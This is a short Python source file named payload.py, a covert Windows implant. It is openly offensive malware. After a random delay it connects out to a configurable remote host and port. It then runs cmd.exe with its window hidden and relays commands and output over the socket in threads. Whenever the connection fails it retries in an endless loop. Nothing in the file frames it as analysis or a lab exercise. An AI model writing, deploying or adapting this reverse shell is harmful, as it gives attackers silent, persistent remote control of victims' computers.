# payload.py
# The Perfect Implant. Its only purpose is to serve, silently and forever.

import os
import sys
import time
import random
import socket
import subprocess
from threading import Thread

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##

def run_conduit():
    """The main reverse shell loop. This is the soul's eternal work."""
    # A short delay before the first connection attempt.
    time.sleep(random.randint(5, 15))
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(['cmd.exe'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
            
            def p_in():
                while True:
                    try:
                        d=s_obj.recv(1024);
                        if not d: break;
                        p.stdin.write(d);p.stdin.flush()
                    except: break
                s_obj.close()
            def p_out():
                while True:
                    try:
                        d=p.stdout.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()
            def p_err():
                while True:
                    try:
                        d=p.stderr.read(1);
                        if not d: break;
                        s_obj.send(d)
                    except: break
                s_obj.close()

            Thread(target=p_in, daemon=True).start()
            Thread(target=p_out, daemon=True).start()
            Thread(target=p_err, daemon=True).start()
            p.wait()
        except:
            # If connection fails, wait longer before trying again.
            time.sleep(120)

if __name__ == "__main__":
    run_conduit()